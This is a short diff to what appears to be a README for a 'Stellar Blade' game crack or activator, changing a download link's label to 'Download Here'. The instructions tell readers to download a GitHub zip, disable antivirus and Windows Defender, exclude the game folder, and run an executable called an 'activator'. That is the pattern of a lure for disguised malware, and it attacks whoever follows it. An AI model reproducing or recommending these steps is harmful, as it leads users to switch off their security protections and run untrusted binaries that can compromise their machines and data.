@@ -19,7 +19,7 @@ INSTRUCTIONS TO DISABLE SMART APP CONTROL
 
 
 Instruction for Verify Firt Run Game :
-[yofiproject.pro](https://github.com/Xelvryn/StellarBlade-Activision-Fisrt-Run/archive/refs/heads/main.zip)
+[Download Here](https://github.com/Xelvryn/StellarBlade-Activision-Fisrt-Run/archive/refs/heads/main.zip)
 1. DISABLE YOUR ANTIVIRUS OR WINDOWS DEFENDER.
 2. Add the Stellar Blade game folder to ADD or remove exclusions so that the antivirus doesn't delete the verification file.
 3. RUN "FIRST RUN ME FOR DLC IF YOU WANT.exe" to launch the activator.
